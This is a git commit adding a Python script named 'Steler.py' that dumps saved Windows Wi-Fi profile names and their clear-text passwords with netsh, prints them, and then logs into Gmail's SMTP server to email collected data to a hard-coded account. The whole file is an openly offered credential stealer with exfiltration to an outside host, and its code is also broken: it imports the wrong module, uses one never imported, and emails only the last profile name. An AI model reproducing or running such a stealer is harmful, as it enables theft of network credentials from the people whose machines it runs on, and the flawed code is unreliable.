a9dc1b9d4672be493ef26e9068379b2c4745ae6f
0000THEARTIST0000 <42154241+0000THEARTIST0000@users.noreply.github.com>
2019-05-02 10:40:45 +0200

    Create Steler.py

---
+++ Steler.py
@@ -0,0 +1,27 @@
+import subprocess
+import smtp
+gmailacc = ""
+gmailpsw = ""
+sentfrom = gmailacc
+sentto = gmailacc
+
+a = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp1252', errors="ignore").split('\n')
+a = [i.split(":")[1][1:-1] for i in a if "All User Profile" in i]
+for i in a:
+    try:
+        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp1252', errors="ignore").split('\n')
+        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+        try:
+            print ("{:<30}|  {:<}".format(i, results[0]))
+        except IndexError:
+            print ("{:<30}|  {:<}".format(i, ""))
+    except subprocess.CalledProcessError:
+        print ("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
+server = smtplib.SMTP('smtp.gmail.com', 587)
+server.ehlo()
+server.starttls()
+server.login(gmailacc,gmailpsw)
+body = i
+server.sendmail(sentfrom, sentto, body)
+server.quit()
+sys.exit()
